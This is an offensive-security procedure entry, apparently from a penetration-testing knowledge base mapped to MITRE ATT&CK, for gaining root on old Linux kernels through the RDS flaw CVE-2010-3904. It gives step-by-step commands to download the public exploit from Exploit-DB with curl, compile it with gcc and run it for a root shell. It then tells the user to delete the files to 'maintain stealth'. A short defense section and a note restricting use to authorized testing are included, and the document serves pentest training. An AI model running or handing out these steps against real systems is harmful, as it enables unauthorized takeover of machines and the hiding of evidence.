---
id: cca1342c-143e-469d-b8b7-f1fce4297313
name: Linux-RDS-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.694679+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/CVE-2010-3904 (RDS)]]'
  - '[[tags/Kernel Exploits]]'
  - '[[tags/Linux - Privilege Escalation]]'
commands:
  - '[[commands/curl-download-rds-exploit]]'
  - '[[commands/gcc-compile-rds-exploit]]'
  - '[[commands/execute-rds-exploit]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-RDS-Privilege-Escalation

## Summary

This procedure exploits CVE-2010-3904, a vulnerability in the Reliable Datagram Sockets (RDS) protocol implementation in the Linux kernel versions 2.6.30 through 2.6.36-rc8, to achieve local privilege escalation from a low-privileged user to root. It involves downloading the exploit code, compiling it, and executing it to trigger a kernel buffer overflow, allowing arbitrary code execution with elevated privileges.

## Description

CVE-2010-3904 affects the RDS protocol, which is used for high-performance networking in Linux kernels. The vulnerability stems from a lack of bounds checking in the rds_page_copy_user() function, leading to a buffer overflow when handling RDS messages. An attacker with local access can send a specially crafted RDS packet to overflow the kernel buffer and execute shellcode, gaining root privileges. This is particularly dangerous in environments where RDS is enabled (e.g., for InfiniBand or high-speed interconnects) and the kernel is unpatched. The procedure assumes local shell access on a vulnerable system and requires a compiler like GCC. Success grants a root shell, enabling further persistence, data exfiltration, or lateral movement. Note: This should only be used in authorized testing environments, as it can crash the system if not handled carefully.

## Requirements

1. Local shell access on a Linux system running kernel 2.6.30 to 2.6.36-rc8 with RDS module loaded (check with `lsmod | grep rds`).
2. GCC or another C compiler installed (e.g., via `apt install build-essential` on Debian-based systems).
3. Internet access to download the exploit code (or pre-downloaded source).
4. Sufficient permissions to write files in the current directory.

## Defense

- Update the Linux kernel to a version beyond 2.6.36-rc8 to patch the vulnerability.
- Disable the RDS module if not required: `modprobe -r rds` or blacklist it in `/etc/modprobe.d/`.
- Monitor for unexpected kernel module loads or local privilege escalations using tools like auditd or AppArmor/SELinux.
- Restrict local user access and monitor compiler usage (e.g., GCC invocations) via process auditing.

## Objectives

1. Download and compile the RDS exploit code.
2. Execute the exploit to gain root privileges.
3. Verify escalation by obtaining a root shell.

## Instructions

### Step 1: Download the Exploit Source Code

**Context**: Retrieve the C source code for the RDS exploit from Exploit-DB to prepare for compilation. This step ensures you have the necessary exploit file on the target system.

**Command** ([[commands/curl-download-rds-exploit]]):
```bash
curl https://www.exploit-db.com/download/15285 -o rds.c
```

> This command fetches the exploit source (rds.c) and saves it locally. Verify the download with `ls -l rds.c` to confirm the file size (approximately 5-6 KB).

### Step 2: Compile the Exploit

**Context**: Compile the C source into an executable binary using GCC. This transforms the source code into a runnable program that can trigger the vulnerability.

**Command** ([[commands/gcc-compile-rds-exploit]]):
```bash
gcc rds.c -o rds_exploit
```

> Compilation should complete without errors if GCC is installed and the kernel headers are available. Check for the binary with `ls -l rds_exploit` and ensure it's executable (`chmod +x rds_exploit` if needed). Expected output is minimal; errors indicate missing dependencies like kernel headers.

### Step 3: Execute the Exploit

**Context**: Run the compiled exploit to trigger the RDS buffer overflow and spawn a root shell. This is the final step for privilege escalation.

**Command** ([[commands/execute-rds-exploit]]):
```bash
./rds_exploit
```

> The exploit sends a crafted RDS packet, overflows the buffer, and executes shellcode to spawn `/bin/sh` as root. If successful, your shell prompt changes to indicate root access (e.g., `#` instead of `$`). Test with `id` to confirm UID 0. Note: This may cause a kernel panic on some systems; have a backup or VM snapshot ready.

### Step 4: Verify and Clean Up

**Context**: Confirm root access and optionally remove traces of the exploit to maintain stealth.

**Instructions**: Run `whoami` or `id` to verify root privileges. To clean up, delete the files: `rm rds.c rds_exploit`. If the exploit crashes the system, reboot and check logs for evidence.
